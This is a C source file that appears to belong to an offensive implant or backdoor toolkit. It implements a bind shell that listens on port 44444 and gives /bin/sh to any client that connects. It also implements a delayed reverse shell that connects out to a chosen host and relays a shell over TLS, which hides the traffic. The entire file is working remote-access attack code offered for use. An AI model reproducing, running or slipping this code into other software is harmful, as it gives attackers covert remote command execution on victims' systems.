#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <openssl/ssl.h>

#include "../include/attacks.h"
#include "../include/utils.h"

static SSL_CTX *create_context(const SSL_METHOD *method) {
    SSL_CTX *ctx;

    ctx = SSL_CTX_new(method);

    if(!ctx) {
        LOG("SSL_CTX_new() failed\n");
        return NULL;
    }

    return ctx;
}

static void handle_shell(SSL *ssl) {
    int p;
    int bytes;
    int serv_shell[2];
    int shell_serv[2];
    char buf[1024];

    if(pipe(serv_shell) == -1 || pipe(shell_serv) == -1) {
        LOG("pipe() failed\n");
        return;
    }

    switch (p = fork()) {
        case -1:
            LOG("fork() failed\n");
            exit(EXIT_FAILURE);
        case 0:
            dup2(serv_shell[0], 0);
            dup2(shell_serv[1], 1);
            dup2(shell_serv[1], 2);
            close(serv_shell[1]);
            close(shell_serv[0]);
            execve("/bin/sh", NULL, NULL);
            LOG("execve failed\n");
            close(serv_shell[0]);
            close(shell_serv[1]);
            exit(EXIT_FAILURE);
        default:
            break;
    }

    close(serv_shell[0]);
    close(shell_serv[1]);

    int ssl_fd = SSL_get_fd(ssl);
    int shell_fd = shell_serv[0];
    fd_set readfds;
    int maxfd = (ssl_fd > shell_fd) ? ssl_fd : shell_fd;
    
    while (1) {
        FD_ZERO(&readfds);
        FD_SET(ssl_fd, &readfds);
        FD_SET(shell_fd, &readfds);
    
        int ready = select(maxfd + 1, &readfds, NULL, NULL, NULL);
        if (ready < 0) {
            LOG("select() failed\n");
            break;
        }
    
        // If SSL socket has data
        if (FD_ISSET(ssl_fd, &readfds)) {
            int bytes = SSL_read(ssl, buf, sizeof(buf));
            if (bytes <= 0) {
                int err = SSL_get_error(ssl, bytes);
                if (err == SSL_ERROR_ZERO_RETURN || err == SSL_ERROR_SYSCALL) {
                    break;
                }
            } else {
                write(serv_shell[1], buf, bytes);
            }
        }
    
        // If shell has output
        if (FD_ISSET(shell_fd, &readfds)) {
            int bytes = read(shell_fd, buf, sizeof(buf));
            if (bytes <= 0) {
                break;
            } else {
                SSL_write(ssl, buf, bytes);
            }
        }
    
        memset(buf, 0, sizeof(buf));
    }

    int status;
    waitpid(p, &status, 0);

    close(serv_shell[1]);
    close(shell_serv[0]);
}

void bind_shell(void) {
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(44444);
    addr.sin_addr.s_addr = INADDR_ANY;

    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    bind(sockfd, (struct sockaddr *)&addr, sizeof(addr));

    listen(sockfd, 0);

    int connfd = accept(sockfd, NULL, NULL);

    for(int i = 0; i < 3; i++) {
        dup2(connfd, i);
    }

    execve("/bin/sh", NULL, NULL);
}

void rev_shell(char *rev_ip, uint16_t rev_port, unsigned int seconds) {
    SSL_CTX *ctx;

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(rev_port);
    inet_pton(AF_INET, rev_ip, &addr.sin_addr);

    if(seconds > 300) seconds = 300;
    LOG("Sleeping %u seconds then attempting to connect\n", seconds);
    sleep(seconds);
    
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);

    if ((connect(sockfd, (struct sockaddr*)&addr, sizeof(addr))) != 0) {
        LOG("Failed to connect\n");
        return;
    }

    LOG("Connection on %s:%u\n", rev_ip, rev_port);

    if (!(ctx = create_context(TLS_method()))) return;
    SSL *ssl = SSL_new(ctx);
    SSL_set_fd(ssl, sockfd);

    if (SSL_connect(ssl) != 1) {
        LOG("SSL Handshake failed\n");
        return;
    }

    LOG("SSL connection established\n");

    handle_shell(ssl);

    LOG("Disconnecting SSL connection\n");

    SSL_shutdown(ssl);
    SSL_free(ssl);
    close(sockfd);
    SSL_CTX_free(ctx);
}